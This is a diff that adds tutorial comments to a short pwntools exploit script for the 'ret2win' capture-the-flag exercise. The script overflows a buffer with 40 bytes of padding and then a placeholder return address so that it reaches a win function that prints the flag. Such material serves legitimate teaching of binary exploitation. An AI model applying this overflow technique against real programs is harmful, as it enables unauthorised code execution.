@@ -27,15 +27,16 @@
 
 from pwn import *
 
-elf = context.binary = ELF('ret2win')
+elf = context.binary = ELF('ret2win')    # settin up the environment
 context.log_level = 'debug'
 
-padding = cyclic(40)
-ret2win = p64(0xdeadbeef)
+padding = cyclic(40)                     # junk to fill up the buffer
+ret2win = p64(0xdeadbeef)                # address of the ret2win function
 
-payload = padding + ret2win
+payload = padding + ret2win              # final payload
 
-io = process(elf.path)
-io.sendline(payload)
-io.recvall()
+io = process(elf.path)                   
+io.sendline(payload)                     # send the payload
+io.wait_for_close()
+print io.recvall()                       # prints the flag!
 ~~~
